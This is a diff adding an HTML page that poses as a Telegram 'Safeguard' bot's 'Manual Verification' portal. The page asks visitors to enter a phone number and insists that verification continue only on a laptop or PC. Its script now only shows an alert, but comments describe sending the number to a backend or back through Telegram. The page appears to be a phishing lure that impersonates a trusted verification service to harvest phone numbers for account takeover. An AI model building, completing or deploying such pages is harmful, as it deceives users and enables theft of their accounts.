@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Manual Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .verification-card {
+            background: #2d2d2d;
+            border-radius: 16px;
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            border: 1px solid #404040;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .shield-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #4CAF50, #45a049);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            border: 3px solid #66bb6a;
+            box-shadow: 0 8px 16px rgba(76, 175, 80, 0.3);
+        }
+        
+        .shield-icon::before {
+            content: "🛡️";
+            font-size: 40px;
+            color: white;
+        }
+        
+        .title {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: #ffffff;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+        
+        .powered-by {
+            color: #ffffff;
+            font-size: 14px;
+        }
+        
+        .powered-by .safeguard-link {
+            color: #64b5f6;
+            text-decoration: none;
+        }
+        
+        .phone-section {
+            margin-bottom: 30px;
+        }
+        
+        .section-label {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .input-label {
+            color: #ffffff;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+        
+        .phone-input {
+            width: 100%;
+            padding: 16px;
+            background: #1a1a1a;
+            border: 2px solid #404040;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            margin-bottom: 20px;
+            transition: border-color 0.3s ease;
+        }
+        
+        .phone-input:focus {
+            outline: none;
+            border-color: #4CAF50;
+            box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.1);
+        }
+        
+        .send-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #2196F3, #1976D2);
+            border: none;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .send-button:hover {
+            background: linear-gradient(135deg, #1976D2, #1565C0);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(33, 150, 243, 0.3);
+        }
+        
+        .disclaimer {
+            color: #888888;
+            font-size: 12px;
+            text-align: center;
+            line-height: 1.4;
+            margin-top: 20px;
+        }
+        
+        @media (max-width: 480px) {
+            .verification-card {
+                padding: 30px 20px;
+            }
+            
+            .title {
+                font-size: 24px;
+            }
+            
+            .shield-icon {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .shield-icon::before {
+                font-size: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-card">
+        <div class="header">
+            <div class="shield-icon"></div>
+            <div class="title">Manual Verification</div>
+            <div class="subtitle">Verify your User Authenticity Below</div>
+            <div class="powered-by">Powered By: <a href="https://t.me/Safeguard" class="safeguard-link">@Safeguard</a></div>
+        </div>
+        
+        <div class="phone-section">
+            <div class="section-label">Enter Phone</div>
+            <div class="input-label">Enter your phone number:</div>
+            <input type="tel" class="phone-input" placeholder="+86 18020218892" value="+86 18020218892">
+            <button class="send-button" onclick="sendPhone()">Send phone</button>
+        </div>
+        
+        <div class="disclaimer">
+            Due to security reasons you can only continue with the Safeguard Portal verification on a Laptop/PC device. Please try again on a compatible device if you are on mobile.
+        </div>
+    </div>
+    
+    <script>
+        function sendPhone() {
+            const phoneInput = document.querySelector('.phone-input');
+            const phoneNumber = phoneInput.value.trim();
+            
+            if (!phoneNumber) {
+                alert('Please enter a phone number');
+                return;
+            }
+            
+            // For now, just show an alert. In a real implementation, you'd send this to your backend
+            alert('Phone number sent: ' + phoneNumber);
+            
+            // You can also send data back to Telegram if needed:
+            // Telegram.WebApp.sendData(JSON.stringify({phone: phoneNumber}));
+        }
+        
+        // Auto-focus the input field
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInput = document.querySelector('.phone-input');
+            phoneInput.focus();
+            phoneInput.select();
+        });
+        
+        // Handle Enter key
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendPhone();
+            }
+        });
+    </script>
+</body>
+</html>
